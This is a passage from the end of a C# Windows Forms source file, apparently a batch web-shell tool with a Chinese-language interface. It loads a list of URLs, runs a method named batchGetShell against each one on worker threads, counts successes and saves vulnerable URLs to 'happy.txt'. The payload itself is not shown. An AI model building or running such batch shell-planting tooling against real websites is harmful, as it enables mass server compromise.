                for (int i = 0; i < this.list_th.Count; i++)
                {
                    Thread item = this.list_th[i];
                    if (!item.IsAlive)
                    {
                        item.Abort();
                        this.list_th.Remove(item);
                        i--;
                    }
                }
                if (this.bt_sucess < this.bt_sum)
                {
                    if (this.list_th.Count < this.bt_thread_size)
                    {
                        Thread thread2 = new Thread(new ParameterizedThreadStart(this.batchGetShell));
                        thread2.Start(this.bt_list_url[this.bt_sucess]);
                        this.bt_sucess++;
                        this.updateStatus();
                        this.list_th.Add(thread2);
                    }
                }
                else if (this.list_th.Count == 0)
                {
                    this.bt_end = true;
                }
            }
        }

        public void stopScan()
        {
            this.loginfo("正在停止.....");
            this.tim_bt.Enabled = false;
            this.updateStatus();
            if (this.c_th != null)
            {
                this.c_th.Abort();
            }
            this.BtnBegin.Enabled = true;
            this.init();
            this.loginfo("已停止.....");
        }

        private void init()
        {
            this.list_th = new List<Thread>();
            this.usertime = 0;
            this.bt_sucess = 0;
            this.bt_ok = 0;
            this.flags = 0;
            this.bt_end = false;

        }

        public void updateStatus()
        {
            this.lbl_bt_sum.Text = Convert.ToString(this.bt_sum);
            this.lbl_bt_sucess.Text = Convert.ToString(this.bt_sucess);
            this.lbl_bt_ok.Text =Convert.ToString(this.bt_ok);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            this.usertime++;
            if (this.TxtLog.TextLength > 0xe10)
            {
                this.TxtLog.Text = "";
            }
            this.label15.Text = this.usertime + "秒";
            if (this.bt_end)
            {
                this.stopScan();
            }
        }

        private void BtnEnd_Click(object sender, EventArgs e)
        {
            if (this.bt_sum == 0)
            {
                MessageBox.Show ("你确定已经开始了吗？");
            }
            else
                this.stopScan();

        }
     


        private void button7_Click(object sender, EventArgs e)
        {
            if (!File.Exists(System.Windows.Forms.Application.StartupPath + "/happy.txt"))
            {
                MessageBox.Show("你确定有漏洞的URL存在？");
            }
            else
                System.Diagnostics.Process.Start(System.Windows.Forms.Application.StartupPath + "/happy.txt");

        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog
            {
                Filter = "文本文件(*.txt)|*.txt"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.txt_bt_url_path.Text = dialog.FileName;
                FileStream stream = new FileStream(dialog.FileName, FileMode.Open, FileAccess.Read);
                StreamReader reader = new StreamReader(stream);
                string item = null;
                while ((item = reader.ReadLine()) != null)
                {
                    int index = item.IndexOf("?");
                    if (index != -1)
                    {
                        item = item.Substring(0, index);
                    }
                    if (!this.bt_list_url.Contains(item))
                    {
                        this.bt_list_url.Add(item);
                    }
                }
                MessageBox.Show("加载列表成功！");
                this.bt_sum = this.bt_list_url.Count;
                this.lbl_bt_sum.Text = Convert.ToString(this.bt_sum);
            }

        }

        private void TxtShellContent_KeyDown(object sender, KeyEventArgs e)
        {
             if (e.Control && (e.KeyCode == Keys.A))
            {
                this.TxtShellContent.SelectAll();
            }
            if(e.Control && (e.KeyCode == Keys.V))
            {
                IDataObject iData = Clipboard.GetDataObject();
                if (iData.GetDataPresent(DataFormats.Text))
                {
                    TxtShellContent.Text = (String)iData.GetData(DataFormats.Text);
                    
                }
            }
            if (e.Control && (e.KeyCode == Keys.C))
            {
                Clipboard.SetDataObject(TxtShellContent.Text);       
            }
        }

        private void TxtInfo_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && (e.KeyCode == Keys.A))
            {
                this.TxtInfo.SelectAll();
            }
            if (e.Control && (e.KeyCode == Keys.C))
            {
                Clipboard.SetDataObject(TxtInfo.Text);
            }
        }

        private void TxtCmdResult_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && (e.KeyCode == Keys.A))
            {
                this.TxtCmdResult.SelectAll();
            }
            if (e.Control && (e.KeyCode == Keys.C))
            {
                Clipboard.SetDataObject(TxtCmdResult.Text);
            }
        }

        private void TxtLog_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && (e.KeyCode == Keys.A))
            {
                this.TxtLog.SelectAll();
            }
            if (e.Control && (e.KeyCode == Keys.D))
            {
                TxtLog.Text="";
            }
        }
    }
}
